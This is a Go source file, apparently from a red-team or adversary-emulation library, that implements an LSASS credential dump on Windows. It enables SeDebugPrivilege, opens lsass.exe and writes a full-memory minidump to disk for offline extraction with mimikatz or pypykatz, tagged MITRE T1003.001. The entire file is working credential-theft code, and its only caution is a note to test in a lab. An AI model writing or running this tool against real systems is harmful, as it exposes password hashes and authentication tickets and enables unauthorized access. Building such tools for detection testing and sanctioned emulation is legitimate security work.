// Package creds provides credential-access primitives.
package creds

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/rankin2000/golangexamples/pkg/tokens"
)

var (
	dbghelp               = syscall.NewLazyDLL("dbghelp.dll")
	procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
)

const miniDumpWithFullMemory = 0x00000002

// LSASSDump writes a minidump of lsass.exe to OutputPath using
// MiniDumpWriteDump.  Parse offline with pypykatz / mimikatz.
// MITRE T1003.001.
//
// Requires SeDebugPrivilege; set EnableSeDebug=true to enable it
// programmatically (Administrators hold the privilege).  Modern Defender
// flags both the on-disk artifact and the syscall pattern - test in a lab.
type LSASSDump struct {
	OutputPath    string // required: path to write the .dmp
	EnableSeDebug bool
}

func (l *LSASSDump) Name() string  { return "lsass-dump" }
func (l *LSASSDump) MITRE() string { return "T1003.001" }

func (l *LSASSDump) Run() error {
	if l.OutputPath == "" {
		return fmt.Errorf("OutputPath is required")
	}
	if l.EnableSeDebug {
		if err := tokens.EnableSeDebug(); err != nil {
			return fmt.Errorf("enable SeDebug: %w", err)
		}
	}

	pid, err := tokens.FindPID("lsass.exe")
	if err != nil {
		return err
	}

	proc, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
		false, pid,
	)
	if err != nil {
		return fmt.Errorf("OpenProcess(lsass): %w", err)
	}
	defer windows.CloseHandle(proc)

	pathW, _ := syscall.UTF16PtrFromString(l.OutputPath)
	file, err := windows.CreateFile(pathW,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0, nil,
		windows.CREATE_ALWAYS,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return fmt.Errorf("create dump file: %w", err)
	}
	defer windows.CloseHandle(file)

	ret, _, callErr := procMiniDumpWriteDump.Call(
		uintptr(proc),
		uintptr(pid),
		uintptr(file),
		miniDumpWithFullMemory,
		0, 0, 0,
	)
	if ret == 0 {
		return fmt.Errorf("MiniDumpWriteDump: %w", callErr)
	}
	return nil
}

// silence unused import in non-Windows builds
var _ = unsafe.Sizeof(0)
